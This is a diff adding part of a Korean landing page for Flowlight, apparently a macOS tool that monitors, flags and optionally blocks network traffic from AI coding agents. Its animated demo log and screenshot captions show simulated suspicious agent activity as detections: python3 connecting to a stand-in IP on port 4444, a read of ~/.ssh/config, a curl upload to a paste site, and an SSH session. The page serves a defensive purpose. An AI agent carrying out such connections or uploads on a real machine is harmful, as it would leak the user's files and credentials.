+        <div><strong>기본은 메타데이터</strong><p>호스트 이름과 포트, 바이트 수. HTTPS 복호화는 직접 켜야 하는 별도 모드이며, 그 결과도 Mac 안에 남습니다.</p></div>
+        <div><strong>커널에서 걸러냅니다</strong><p>캡처는 DNS 응답과 TLS ClientHello만 통과시킵니다. 나머지는 Flowlight가 보기 전에 버려집니다.</p></div>
+        <div><strong>조회는 내가 정합니다</strong><p>주소의 소유자를 알아낼 때는 호스트 이름이 없는 공용 IP만 Team Cymru로 보내며, 클릭 한 번으로 끌 수 있습니다. 하루 한 번 업데이트 확인은 GitHub에 최신 버전만 물어보고, 이것도 끌 수 있습니다.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="agent-detail" aria-label="에이전트 상세 스크린샷">
+    <div class="wrap">
+      <figure class="detail-shot"><div class="frame"><img src="{{root}}assets/screenshots/agent-detail.png" width="1600" height="622" loading="lazy"
+        alt="Flowlight에 표시된 Claude Code 상세: 호출 횟수와 실패 하나가 붙은 도구와 MCP 서버, 허용 목록, 그리고 실패한 git push, 응답과 요청이 함께 있는 paste.example로의 curl 업로드, npm install, GitHub 이슈, 문서 검색, 파일 읽기가 각각 결과와 함께 나열된 도구 호출 탭"></div>
+        <figcaption><b>에이전트 하나, 도구 호출 전부.</b> Claude Code가 띄운 git과 curl, MCP 서버의 트래픽은 Claude Code의 것으로
+          집계됩니다. HTTPS 검사를 켜면 <em>도구 호출</em> 탭에서 모델이 무엇을 요청했고 무엇이 돌아왔으며 각 도구가 어떤 요청을
+          냈는지 보입니다. paste.example로 간 curl 업로드와, 실패한 git push까지.</figcaption></figure>
+    </div>
+  </section>
+
+  <section class="band" aria-label="스크린샷 더 보기">
+    <div class="wrap screens">
+      <figure><div class="frame"><img src="{{root}}assets/screenshots/reports.png" width="1600" height="1075" loading="lazy"
+        alt="시간별 수신·송신 막대와 앱, 목적지, 프로토콜 도넛 차트가 있는 보고서 뷰"></div>
+        <figcaption><b>보고서.</b> 초에서 연까지의 확대·축소, 세 가지 묶음, 앱이 수백 개여도 읽히는 차트.</figcaption></figure>
+      <figure><div class="frame"><img src="{{root}}assets/screenshots/alerts.png" width="1600" height="1075" loading="lazy"
+        alt="에이전트 유출, 이메일, FTP, 자리 비움, 트래픽 급증 알림이 나열된 알림 뷰"></div>
+        <figcaption><b>알림.</b> 하나하나가 앱과 목적지, 그리고 기준을 넘긴 수치를 밝힙니다.</figcaption></figure>
+    </div>
+  </section>
+
+  <section class="band" id="install">
+    <div class="wrap install">
+      <div class="section-head" style="margin:0">
+        <p class="eyebrow">설치</p>
+        <h2>1분 안에 돌아갑니다</h2>
+        <ol class="steps" style="margin-top:16px">
+          <li><div><strong>Flowlight.dmg 다운로드</strong><p>열어서 Flowlight를 응용 프로그램으로 드래그하세요. 릴리스마다 <a href="https://github.com/{{repo}}/releases/latest">.pkg 설치 프로그램</a>도 함께 제공됩니다. 릴리스는 Developer ID 인증서로 서명되고 Apple의 공증을 받습니다.</p></div></li>
+          <li><div><strong>실행하기</strong><p>1초 안에 트래픽이 나타나고, 메뉴 막대에 실시간 ↓↑ 속도가 자리 잡습니다.</p></div></li>
+          <li><div><strong>트래픽에 이름 붙이기</strong><p>한 번만 하는 설정을 승인하면(암호 입력은 한 번뿐) Flowlight가 호스트 이름을 읽을 수 있습니다.</p></div></li>
+        </ol>
+      </div>
+      <div style="display:grid;gap:14px">
+        <p style="color:var(--muted)">직접 빌드하고 싶거나, 먼저 샘플 데이터로 둘러보고 싶으신가요?</p>
+<pre><span class="c"># build from source (Xcode 16+, no Apple account needed)</span>
+brew install xcodegen
+git clone https://github.com/{{repo}}.git
+cd flowlight &amp;&amp; xcodegen generate
+scripts/build-local.sh
+
+<span class="c"># explore with 90 days of synthetic traffic</span>
+open Flowlight.app --args -FLDemo YES</pre>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="faq">
+    <div class="wrap">
+      <div class="section-head"><p class="eyebrow">자주 묻는 질문</p><h2>질문과 답</h2></div>
+      <div class="faq">
+        <details><summary>Flowlight가 트래픽을 차단합니까?</summary>
+          <p>기본적으로는 지켜보고 알립니다. 에이전트가 허용 목록을 벗어날 때도 알립니다. 그런 연결을 거부할 수도 있지만,
+            그 기능을 켜 둔 에이전트에 한해서만, 그리고 네트워크 확장 엔진이 설치된 경우에만 가능합니다. 샘플러는 보는 것만
+            할 수 있습니다. 로컬 트래픽과 DNS, Apple 서비스, Flowlight 자신의 연결은 절대 거부하지 않습니다.</p></details>
+        <details><summary>내 HTTPS 트래픽을 읽을 수 있습니까?</summary>
+          <p>기본값으로는 읽지 않습니다. 클라이언트가 연결을 열 때 요청하는 호스트 이름(TLS SNI)과 이름을 주소로 이어 주는
+            DNS 응답을 읽고, 내용은 암호화된 채로 둡니다. 전체를 보고 싶다면 <strong>HTTPS 검사</strong>가 따로 있습니다.
+            직접 켜야 하는 모드로, Flowlight가 자체 인증 기관을 가진 로컬 프록시가 되어 그리로 보낸 앱(기본값은 AI 에이전트만)을
+            복호화하며, 모델이 에이전트에게 실행하라고 요청한 모든 도구 호출까지 포함합니다. 인증서를 고정하는 앱은 이를 거부할
+            수 있습니다. Flowlight는 내장된 Apple 서비스와 암호 관리자 목록을 검사에서 제외합니다.</p></details>
+        <details><summary>Little Snitch나 LuLu와 무엇이 다릅니까?</summary>
+          <p>그 도구들은 연결을 허용할지 묻는 방화벽입니다. Flowlight는 분석 도구입니다. 어떤 배율로든 볼 수 있는 기록,
+            이상 탐지 기준선, 그리고 AI 에이전트를 위해 만든 규칙. 둘을 나란히 써도 잘 맞습니다.</p></details>
+        <details><summary>왜 암호를 묻습니까?</summary>
+          <p>macOS는 관리자만 네트워크 패킷을 읽게 합니다. 한 번만 하는 설정으로 내 계정에 읽기 권한을 주는데, Wireshark도
+            같은 방식입니다. 캡처 화면에서 언제든 되돌릴 수 있습니다.</p></details>
+        <details><summary>어떤 MCP 서버나 도구가 요청을 냈는지 알 수 있습니까?</summary>
+          <p>프로세스 수준에서는 알 수 있습니다. Flowlight는 각 프로세스를 시작한 에이전트까지 거슬러 올라가므로, 셸 도구의
+            curl이나 MCP 서버의 연결이 그 에이전트에 귀속되고, MCP 서버의 이름은 Claude Code, Claude Desktop, Cursor, Windsurf,
+            VS Code, Codex, Zed, Gemini CLI 설정에서 가져옵니다. 오래 떠 있는 서버 안에서 어떤 개별 도구 호출이 연결을 열었는지는
+            알 수 없습니다.</p></details>
+        <details><summary>허용 목록이 트래픽을 차단합니까?</summary>
+          <p>허용 목록은 기본적으로 위반을 보고합니다. 네트워크 확장이 활성화되어 있으면 에이전트별로 적용을 켜서 목록에 없는 목적지를 거부할 수 있습니다. nettop 샘플러는 위반을 보고할 수는 있지만 연결을 차단하지는 못합니다.</p></details>
+        <details><summary>어떤 에이전트를 인식합니까?</summary>
+          <p>Claude Code, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, Aider, Goose, OpenCode, Ollama, LM Studio,
+            ChatGPT, Claude, Zed, Perplexity, ZCode, 그리고 알려진 LLM API를 호출하는 브라우저가 아닌 모든 프로세스입니다. 하나를
+            더하는 일은 한 줄짜리 풀 리퀘스트입니다.</p></details>
+        <details><summary>업데이트는 어떻게 합니까?</summary>
+          <p>Flowlight는 하루에 한 번 GitHub에 최신 릴리스를 확인합니다. 새 릴리스가 있으면 릴리스 노트를 보여주고, 디스크
+            이미지를 받아 공개된 SHA-256과 맞춰 검증한 뒤 열어 줍니다. 이 확인은 설정에서 끌 수 있습니다.</p></details>
+        <details><summary>정말 무료입니까?</summary>
+          <p>네. GPL-3.0을 따르는 자유 소프트웨어입니다. 유료 등급도, 데이터 수집도 없습니다.</p></details>
+      </div>
+    </div>
+  </section>
+
+  
+  <section class="final">
+    <div class="wrap">
+      <h2>내 Mac에서 무엇이 나가는지 아세요.</h2>
+      <p class="lede">macOS 15 이상을 위한 자유 소프트웨어.</p>
+      <div class="cta">
+        <a class="btn btn-primary" href="{{dmg}}">macOS용 다운로드</a>
+        <a class="btn btn-ghost" href="https://github.com/{{repo}}">소스 코드 보기</a>
+        <p class="brew"><code>brew install --cask xinbetween/tap/flowlight</code><button type="button" class="copy" data-copy="brew install --cask xinbetween/tap/flowlight">복사</button></p>
+      </div>
+    </div>
+  </section>
+
+</main>
+<script>
+  // Stream new lines into the connection log. The full log is readable at rest.
+  //
+  // The feed is a tour of what Flowlight does now: traffic and alerts, but also a refusal, a guardrail taking a
+  // tool away before the model is offered it, a mocked answer, peer-to-peer Wi-Fi, a device arriving, and a tool
+  // call tied to the request it caused.
+  (function () {
+    var log = document.getElementById("log");
+    if (!log || window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
+    var feed = [
+      { app: "Chrome", dest: "github.com", proto: "https:443", dir: "down", bytes: "↓ 640 KB" },
+      { app: "codex", dest: "api.openai.com", proto: "https:443", dir: "up", bytes: "↑ 900 KB" },
+      { kind: "tool", note: "↳ Read: ~/.ssh/config — 네트워크 호출 없음" },
+      { app: "claude", dest: "registry.npmjs.org", proto: "https:443", dir: "down", bytes: "↓ 300 KB" },
+      { app: "claude › node", dest: "registry.npmjs.org", proto: "https:443", dir: "up", bytes: "거부됨",
+        kind: "block", note: "⛔ 규칙 “18:00 이후 패키지 설치 금지”" },
+      { app: "zoom.us", dest: "zoom.us", proto: "zoom-media:8801", dir: "down", bytes: "↓ 6.1 MB" },
+      { kind: "device", note: "● Backup Drive 연결됨 · USB · 2 TB" },
+      { app: "python3", dest: "203.0.113.45", proto: "tcp:4444", dir: "up", bytes: "↑ 40 KB",
+        kind: "flag", note: "⚠ 에이전트가 이름 없는 호스트에 접속" },
+      { app: "rapportd", dest: "Continuity · 근처 기기", proto: "llw0", dir: "down", bytes: "↓ 310 KB", kind: "p2p" },
+      { app: "claude", dest: "mcp.github.com", proto: "tools/call", dir: "down", bytes: "isError",
+        kind: "guard", note: "🛡 가드레일: create_issue 거부, 모델에 이유 전달" },
+      { app: "Safari", dest: "en.wikipedia.org", proto: "https:443", dir: "down", bytes: "↓ 250 KB" },
+      { app: "claude", dest: "github.com", proto: "ssh:22", dir: "up", bytes: "↑ 30 KB",
+        kind: "flag", note: "⚠ 에이전트가 SSH 세션을 열었음" },
+      { app: "Flowlight", dest: "127.0.0.1", proto: "ollama:11434", dir: "up", bytes: "↑ 2 KB",
+        kind: "ask", note: "≡ 질문: 이 Mac에서 답변, 나간 것 없음" },
+      { app: "sharingd", dest: "AirDrop · 근처 기기", proto: "awdl0", dir: "up", bytes: "↑ 820 MB", kind: "p2p" },
+      { app: "iCloud", dest: "p45-content.icloud.com", proto: "https:443", dir: "up", bytes: "↑ 700 KB" },
+      { app: "Cursor", dest: "api2.cursor.sh", proto: "POST /v1/chat", dir: "down", bytes: "503",
+        kind: "mock", note: "✎ Flowlight가 응답, 서버로는 전송 안 됨" },
+    ];
+    var i = 0;
+    function line(r) {
+      var li = document.createElement("li");
+      li.className = ["enter", r.kind || ""].join(" ").trim();
+      // A row with no destination is an event rather than a connection: a tool call, a device arriving.
+      if (!r.dest) {
+        li.innerHTML = '<span class="app"></span><span class="note"></span>';
+        li.querySelector(".note").textContent = r.note;
+        return li;
+      }
+      li.innerHTML = '<span class="app"></span><span class="dest"><b></b> · <i></i></span>' +
+        '<span class="bytes ' + (r.dir || "") + '"></span>' + (r.note ? '<span class="note"></span>' : "");
+      li.querySelector(".app").textContent = r.app;
+      li.querySelector(".dest b").textContent = r.dest;
+      var proto = li.querySelector(".dest i");
+      proto.textContent = r.proto;
+      proto.style.fontStyle = "normal";
+      li.querySelector(".bytes").textContent = r.bytes;
+      if (r.note) li.querySelector(".note").textContent = r.note;
+      return li;
+    }
+    setInterval(function () {
+      log.insertBefore(line(feed[i++ % feed.length]), log.firstChild);
+      while (log.children.length > 12) log.removeChild(log.lastChild);
+    }, 1900);
+  })();
+</script>
